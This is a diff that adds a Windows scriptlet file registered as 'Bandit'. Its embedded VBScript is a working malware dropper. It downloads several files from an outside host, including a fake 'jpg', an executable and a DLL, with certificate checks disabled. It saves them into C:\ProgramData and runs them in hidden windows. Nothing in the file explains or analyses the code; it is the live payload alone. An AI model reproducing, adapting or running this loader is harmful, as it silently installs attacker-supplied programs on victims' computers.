@@ -1,0 +1,51 @@
+<?XHL version="1.0"?>
+<scriptlet>
+
+<registration
+	description="Bandit"
+	progid="Bandit"
+	version="1.00"
+	classid="{AAAAllll-0000-0000-0000-0000FEEDACDC}"
+	>
+
+	<script language="VBScript">
+		<![CDATA[
+
+			Const adTypeBinary = 1
+			Const adSaveCreateOverWrite = 2
+			Dim http,ado
+			Set http = CreateObject("Msxml2.ServerXMLHTTP.6.0") 
+			http.SetOption 2, 13056
+			http.open "GET", "http://test.hhlvwsc.cn/new.jpg",False 
+			http.send
+			Set ado = createobject("Adodb.Stream") 
+			ado.Type = adTypeBinary 
+			ado.Open
+			ado.Write http.responseBody
+			ado. SaveToFile "C:\ProgramData\jpg. jpg"
+			ado.Close
+			CreateObject("WScript.Shell").Run "C:\ProgramData\jpg.jpg",0,false 
+			http.open "GET","http://test.hhlvwsc.cn/Junction.exe",False 
+			http.send
+			ado.Type = adTypeBinary 
+			ado.Open
+			ado.Write http.responseBody
+			ado. SaveToFile "C:\ProgramData\Junction.exe"
+			ado.Close
+			http.open "GET","http://test.hhlvwsc.cn/basicnetutils.dll",False 
+			http.send 
+			ado.Open
+			ado.Write http.responseBody
+			ado.SaveToFile "C:\ProgramData\basicnetutils.dll"
+			ado.Close
+			http.open "GET","http://test.hhlvwsc.cn/q.crt",False 
+			http.send 
+			ado.Open
+			ado.Write http.responseBody
+			ado.SaveToFile "C:\ProgramData\activeds.crt"
+			ado.Close
+			CreateObject ("WScript.Shell").Run "C:\ProgramData\Junction.exe",0,true
+		]]>
+	</script>
+
+</registration>
